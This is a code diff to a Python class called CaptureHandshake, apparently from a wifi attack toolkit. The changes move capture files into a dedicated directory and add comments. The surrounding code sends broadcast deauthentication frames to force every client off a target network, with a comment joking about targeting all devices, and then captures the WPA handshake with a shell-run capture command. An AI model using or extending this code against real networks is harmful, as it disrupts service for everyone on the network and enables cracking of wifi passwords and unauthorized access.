@@ -9,7 +9,9 @@ from wifi_base import WifiBase
 class CaptureHandshake(WifiBase):
     def __init__(self, interface='wlan0', debug=False):
         super().__init__(interface, debug)
-        self.capture_prefix = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+        self.capture_handshake_dir = "captured_handshake"
+        captured_prefix = os.path.join(self.capture_handshake_dir, f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+        self.capture_prefix = captured_prefix
         
     def capture_handshake(self, bssid, channel, deauth_packets=25, capture_duration=30):
         #this will attempt to capture handshake
@@ -20,6 +22,7 @@ class CaptureHandshake(WifiBase):
         if not capture_file:
             return None
 
+        #the program will send deauth_packets to the network
         self._send_deauth_packets(bssid, deauth_packets)
         
         #wait for the handshake
@@ -50,6 +53,7 @@ class CaptureHandshake(WifiBase):
         )
         
         self.capture_process = subprocess.Popen(
+            #it will run captured_cmd in commandline
             capture_cmd,
             shell=True,
             stdout=subprocess.DEVNULL,
@@ -68,7 +72,7 @@ class CaptureHandshake(WifiBase):
                 addr1="ff:ff:ff:ff:ff:ff", #Target all devices in the network(hehe)
                 addr2=bssid,
                 addr3=bssid
-            ) / Dot11Deauth(reason=7)
+            ) / Dot11Deauth(reason=7) 
             
             sendp(
                 packet,
